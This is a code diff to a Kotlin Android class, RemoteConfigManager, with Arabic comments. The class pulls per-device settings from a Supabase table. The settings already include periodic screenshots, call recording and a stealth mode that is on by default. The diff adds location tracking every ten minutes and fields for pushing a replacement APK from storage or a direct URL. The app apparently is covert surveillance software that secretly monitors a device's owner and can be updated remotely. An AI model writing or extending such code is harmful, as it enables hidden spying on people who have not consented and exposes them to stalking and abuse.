@@ -33,7 +33,7 @@ class RemoteConfigManager(private val context: Context) {
             
             // محاولة جلب السجل الخاص بالجهاز
             val response = client.from(TABLE_NAME)
-                .select(Columns.list("screenshot_interval_ms", "record_calls", "stealth_mode_active")) {
+                .select(Columns.list("screenshot_interval_ms", "location_interval_ms", "record_calls", "stealth_mode_active", "target_version", "update_apk_path", "update_apk_url")) {
                     filter {
                         eq("device_id", deviceId)
                     }
@@ -62,6 +62,7 @@ class RemoteConfigManager(private val context: Context) {
             val defaultSettings = mapOf(
                 "device_id" to deviceId,
                 "screenshot_interval_ms" to 60000,
+                "location_interval_ms" to 600000,
                 "record_calls" to false,
                 "stealth_mode_active" to true
             )
@@ -79,6 +80,10 @@ class RemoteConfigManager(private val context: Context) {
 @Serializable
 data class AppSettings(
     val screenshot_interval_ms: Long = 60000,
+    val location_interval_ms: Long = 600000, // 10 minutes default
     val record_calls: Boolean = false,
-    val stealth_mode_active: Boolean = true
+    val stealth_mode_active: Boolean = true,
+    val target_version: Int = 1,
+    val update_apk_path: String? = null,  // مسار Supabase Storage
+    val update_apk_url: String? = null    // رابط HTTP مباشر (الأولوية عند وجوده)
 )
